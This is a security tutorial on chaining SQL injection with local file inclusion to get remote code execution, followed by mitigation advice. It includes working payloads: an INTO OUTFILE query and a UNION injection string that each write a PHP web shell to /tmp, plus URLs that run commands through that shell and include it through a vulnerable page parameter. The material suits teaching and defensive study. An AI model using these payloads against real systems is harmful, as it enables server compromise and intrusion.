
### SQL Injection Combined with Local File Inclusion to Achieve Remote Code Execution (RCE)

**Concept Overview:**

SQL Injection (SQLi) and Local File Inclusion (LFI) are two critical vulnerabilities that, when combined, can lead to Remote Code Execution (RCE). This occurs when an attacker leverages SQL injection to manipulate the database and then uses LFI to include and execute a malicious file on the server.

**Exploitation Example:**

1. **SQL Injection to Write a Malicious PHP File:**

   By using SQL injection, an attacker can write a malicious PHP script to the server’s file system. This is done by executing a query that writes PHP code into a file. For example:

   ```sql
   SELECT "<?php system($_GET['c'])?>" INTO OUTFILE "/tmp/shell.php";
   ```

   - **Explanation:**
     - `<?php system($_GET['c'])?>`: This PHP code snippet allows the execution of commands passed via the `c` parameter in the URL.
     - `INTO OUTFILE "/tmp/shell.php"`: This specifies the location and name of the file where the PHP code will be written.

2. **Triggering the Malicious PHP File:**

   Once the PHP file is created, it can be accessed via the web server. By navigating to the URL where the file is hosted, the attacker can execute arbitrary commands. For example:

   ```
   http://192.168.1.2/tmp/shell.php?c=ls
   ```

   - **Explanation:**
     - `c=ls`: This parameter is passed to the `system()` function in the PHP code, which executes the `ls` command on the server, listing files in the directory.

**Practical Application:**

1. **SQL Injection Payload:**

   To inject and write the PHP file, the attacker might use a payload in a vulnerable SQL query parameter:

   ```
   1' UNION ALL SELECT "<?php system($_GET['c'])?>" INTO OUTFILE "/tmp/shell.php" --+
   ```

   This payload assumes that the application is vulnerable to SQL injection and allows the use of the `UNION ALL` operator to execute the injection and create the file.

2. **Local File Inclusion (LFI) Vulnerability:**

   After the malicious file is created, the attacker needs to find a way to include or access this file. If the application is vulnerable to LFI, it might allow including files from the server's file system. For instance:

   ```
   http://192.168.1.2/index.php?page=/tmp/shell.php
   ```

   This URL assumes that the `page` parameter in the `index.php` script is vulnerable to LFI and allows the inclusion of files from the server.

**Mitigation Strategies:**

1. **SQL Injection Prevention:**
   - Use parameterized queries and prepared statements.
   - Employ ORM frameworks to abstract SQL queries.
   - Validate and sanitize user inputs.

2. **File System Permissions:**
   - Restrict file write permissions for web server processes.
   - Disable file writing functions where not needed.

3. **Local File Inclusion Prevention:**
   - Avoid allowing user input to directly influence file paths.
   - Implement robust input validation and sanitation.

**Conclusion:**

Combining SQL Injection with Local File Inclusion can lead to severe security breaches, including Remote Code Execution. It is crucial to implement proper security measures to prevent such vulnerabilities and safeguard the integrity of web applications.

